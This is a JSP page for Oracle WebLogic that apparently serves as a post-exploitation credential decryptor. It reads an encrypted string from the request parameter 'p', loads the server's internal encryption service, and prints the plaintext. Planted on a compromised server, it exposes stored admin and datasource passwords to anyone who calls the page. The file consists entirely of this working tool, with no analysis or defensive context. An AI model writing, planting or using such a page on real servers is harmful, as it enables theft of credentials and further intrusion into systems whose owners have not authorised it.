<%@page pageEncoding="utf-8" %>
<%@page import="weblogic.security.internal.*,weblogic.security.internal.encryption.*" %>
<%
    EncryptionService es = null;
    ClearOrEncryptedService ces = null;
    String s = request.getParameter("p");
    es = SerializedSystemIni.getEncryptionService();
    if (es == null) {
        out.println("Unable to initialize encryption service");
        return;
    }
    ces = new ClearOrEncryptedService(es);
    if (s != null && s != ces.decrypt(s)) {
        out.println("[+] Data= " + s + "<br/>");
        out.println("[+] Decode_Data= " + ces.decrypt(s));
    } else {
        out.println("Decode Fail !");
    }
%>
